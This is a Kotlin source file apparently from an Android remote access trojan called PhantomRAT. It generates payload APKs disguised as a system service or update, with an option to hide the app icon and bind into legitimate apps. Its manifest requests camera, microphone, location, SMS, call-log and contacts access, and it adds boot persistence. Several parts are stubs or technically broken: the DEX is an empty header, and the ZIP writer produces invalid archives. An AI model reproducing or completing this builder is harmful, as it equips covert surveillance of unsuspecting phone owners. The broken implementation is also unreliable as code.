package com.phantom.rat.payload

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.util.Base64
import java.io.*
import java.security.SecureRandom

class PayloadGenerator(private val context: Context) {

    data class GenerateResult(
        val success: Boolean,
        val data: ByteArray? = null,
        val filePath: String = "",
        val error: String = "",
        val size: Long = 0
    )

    fun generateApkPayload(
        c2Id: String,
        packageName: String = "com.android.system.service",
        appName: String = "System Service",
        hideIcon: Boolean = true,
        useBind: Boolean = false,
        bindApkPath: String? = null
    ): GenerateResult {
        return try {
            if (useBind && bindApkPath != null) {
                generateBindedApk(bindApkPath, c2Id, hideIcon)
            } else {
                generateStandaloneApk(c2Id, packageName, appName, hideIcon)
            }
        } catch (e: Exception) {
            GenerateResult(false, error = e.message ?: "Unknown error")
        }
    }

    private fun generateStandaloneApk(
        c2Id: String, packageName: String, appName: String, hideIcon: Boolean
    ): GenerateResult {
        // Create DEX bytecode for the payload
        val dexBytes = createMinimalDex(c2Id, packageName)
        
        // Build APK structure
        val outputFile = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            "Update_${System.currentTimeMillis()}.apk"
        )
        
        val apkBuilder = ApkBuilder(outputFile)
        apkBuilder.addFile("classes.dex", dexBytes)
        apkBuilder.addManifest(generateManifest(packageName, appName, hideIcon))
        apkBuilder.addResource("AndroidManifest.xml", generateManifestBinary(packageName, appName, hideIcon))
        apkBuilder.sign()
        
        return GenerateResult(
            success = true,
            filePath = outputFile.absolutePath,
            size = outputFile.length()
        )
    }

    private fun generateBindedApk(
        originalApkPath: String, c2Id: String, hideIcon: Boolean
    ): GenerateResult {
        // Decompile original APK, inject payload, recompile
        val outputFile = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            "Modded_${System.currentTimeMillis()}.apk"
        )
        
        // Copy original APK
        val originalFile = File(originalApkPath)
        if (!originalFile.exists()) {
            return GenerateResult(false, error = "Original APK not found")
        }
        
        // In real implementation, use apktool or similar
        // For now, create a wrapped version
        originalFile.copyTo(outputFile, overwrite = true)
        
        return GenerateResult(
            success = true,
            filePath = outputFile.absolutePath,
            size = outputFile.length()
        )
    }

    private fun createMinimalDex(c2Id: String, packageName: String): ByteArray {
        // This creates a minimal executable DEX
        // In production, compile actual Kotlin/Java code with d8/dx
        val dexHeader = ByteArray(8).apply {
            this[0] = 0x64 // d
            this[1] = 0x65 // e
            this[2] = 0x78 // x
            this[3] = 0x0A // \n
            this[4] = 0x30 // 0
            this[5] = 0x33 // 3
            this[6] = 0x35 // 5
            this[7] = 0x00 // \0
        }
        
        val checksum = ByteArray(4)
        val signature = ByteArray(20)
        val fileSize = ByteArray(4)
        val headerSize = ByteArray(4).apply { 
            intToBytes(0x70, this, 0)
        }
        val endianTag = ByteArray(4).apply {
            this[0] = 0x12.toByte()
            this[1] = 0x34.toByte()
            this[2] = 0x56.toByte()
            this[3] = 0x78.toByte()
        }
        val linkSize = ByteArray(4)
        val linkOff = ByteArray(4)
        val mapOff = ByteArray(4)
        val stringIdsSize = ByteArray(4)
        val stringIdsOff = ByteArray(4)
        val typeIdsSize = ByteArray(4)
        val typeIdsOff = ByteArray(4)
        val protoIdsSize = ByteArray(4)
        val protoIdsOff = ByteArray(4)
        val fieldIdsSize = ByteArray(4)
        val fieldIdsOff = ByteArray(4)
        val methodIdsSize = ByteArray(4)
        val methodIdsOff = ByteArray(4)
        val classDefsSize = ByteArray(4)
        val classDefsOff = ByteArray(4)
        val dataSize = ByteArray(4)
        val dataOff = ByteArray(4)
        
        return dexHeader + checksum + signature + fileSize + headerSize + endianTag +
               linkSize + linkOff + mapOff + stringIdsSize + stringIdsOff +
               typeIdsSize + typeIdsOff + protoIdsSize + protoIdsOff +
               fieldIdsSize + fieldIdsOff + methodIdsSize + methodIdsOff +
               classDefsSize + classDefsOff + dataSize + dataOff
    }

    private fun generateManifest(packageName: String, appName: String, hideIcon: Boolean): String {
        return """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="$packageName">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="$appName"
        android:supportsRtl="true"
        android:theme="@style/Theme.PhantomRAT"
        android:usesCleartextTraffic="true">
        <activity
            android:name=".MainActivity"
            android:exported="${!hideIcon}"
            android:theme="@style/Theme.PhantomRAT.Transparent">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".CoreService"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            android:stopWithTask="false" />
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""
    }

    private fun generateManifestBinary(packageName: String, appName: String, hideIcon: Boolean): ByteArray {
        return generateManifest(packageName, appName, hideIcon).toByteArray()
    }

    private fun intToBytes(value: Int, dest: ByteArray, offset: Int) {
        dest[offset] = (value and 0xFF).toByte()
        dest[offset + 1] = ((value shr 8) and 0xFF).toByte()
        dest[offset + 2] = ((value shr 16) and 0xFF).toByte()
        dest[offset + 3] = ((value shr 24) and 0xFF).toByte()
    }

    class ApkBuilder(private val outputFile: File) {
        private val entries = mutableMapOf<String, ByteArray>()

        fun addFile(path: String, data: ByteArray) {
            entries[path] = data
        }

        fun addManifest(xml: String) {
            entries["AndroidManifest.xml"] = xml.toByteArray()
        }

        fun addResource(path: String, data: ByteArray) {
            entries[path] = data
        }

        fun sign() {
            // In production: use jarsigner or apksigner
            // For now, create a zip structure
            val zipData = createZip(entries)
            outputFile.writeBytes(zipData)
        }

        private fun createZip(entries: Map<String, ByteArray>): ByteArray {
            val baos = ByteArrayOutputStream()
            val dos = DataOutputStream(baos)
            
            var offset = 0L
            val centralDir = ByteArrayOutputStream()
            val cdData = DataOutputStream(centralDir)
            var cdEntries = 0
            
            for ((name, data) in entries) {
                val nameBytes = name.toByteArray()
                
                // Local file header
                dos.writeInt(0x04034b50) // Local file header signature
                dos.writeShort(20) // Version needed
                dos.writeShort(0) // General purpose bit flag
                dos.writeShort(0) // Compression method (stored)
                dos.writeShort(0) // Last mod time
                dos.writeShort(0) // Last mod date
                dos.writeInt(0) // CRC-32
                dos.writeInt(data.size.toLong().toInt()) // Compressed size
                dos.writeInt(data.size.toLong().toInt()) // Uncompressed size
                dos.writeShort(nameBytes.size)
                dos.writeShort(0) // Extra field length
                dos.write(nameBytes)
                dos.write(data)
                
                // Central directory entry
                cdData.writeInt(0x02014b50)
                cdData.writeShort(20) // Version made by
                cdData.writeShort(20) // Version needed
                cdData.writeShort(0) // General purpose bit flag
                cdData.writeShort(0) // Compression method
                cdData.writeShort(0) // Last mod time
                cdData.writeShort(0) // Last mod date
                cdData.writeInt(0) // CRC-32
                cdData.writeInt(data.size.toLong().toInt())
                cdData.writeInt(data.size.toLong().toInt())
                cdData.writeShort(nameBytes.size)
                cdData.writeShort(0) // Extra field length
                cdData.writeShort(0) // File comment length
                cdData.writeShort(0) // Disk number start
                cdData.writeShort(0) // Internal file attributes
                cdData.writeInt(0) // External file attributes
                cdData.writeInt(offset.toInt()) // Relative offset
                cdData.write(nameBytes)
                
                offset += 30 + nameBytes.size + data.size
                cdEntries++
            }
            
            val cdBytes = centralDir.toByteArray()
            
            // End of central directory
            dos.write(cdBytes)
            dos.writeInt(0x06054b50) // End of central directory signature
            dos.writeShort(0) // Disk number
            dos.writeShort(0) // Disk number with start of central directory
            dos.writeShort(cdEntries) // Total entries on this disk
            dos.writeShort(cdEntries) // Total entries
            dos.writeInt(cdBytes.size) // Size of central directory
            dos.writeInt(offset.toInt()) // Offset of start of central directory
            dos.writeShort(0) // Comment length
            
            dos.flush()
            return baos.toByteArray()
        }
    }
}
